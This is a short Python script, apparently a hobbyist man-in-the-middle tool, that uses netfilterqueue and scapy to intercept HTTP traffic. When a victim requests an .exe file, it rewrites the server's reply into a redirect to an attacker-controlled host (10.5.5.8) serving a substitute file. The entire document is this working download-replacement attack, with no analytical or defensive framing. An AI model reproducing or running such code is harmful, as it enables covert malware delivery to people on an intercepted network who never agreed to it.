import netfilterqueue
import scapy.all as scapy



ack_list = []


def process_packet(packet):
    sp = scapy.IP(packet.get_payload())
    if sp.haslayer(scapy.Raw):
        load = str(sp[scapy.Raw].load)
        if sp[scapy.TCP].dport == 80:
            print ("{+} HTTP Request > \n")
            if ".exe" in load:
                print ("exe acket -----------------------\n")
                ack_list.append(sp[scapy.TCP].ack)
                print (sp.show())
        elif sp[scapy.TCP].sport == 80:
            if sp[scapy.TCP].seq in ack_list:
                ack_list.remove(sp[scapy.TCP].seq)
                #print(load,type(load))
                print ("{+} Replacing File !! > \n")
                sp[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently\nLocation: http://10.5.5.8/test.py\n\n'
                print (load) 
                del sp[scapy.IP].len
                del sp[scapy.IP].chksum
                del sp[scapy.TCP].chksum
                print (sp.show())
                packet.set_payload(bytes(sp))

    packet.accept()

q = netfilterqueue.NetfilterQueue()
q.bind(0, process_packet)
q.run()


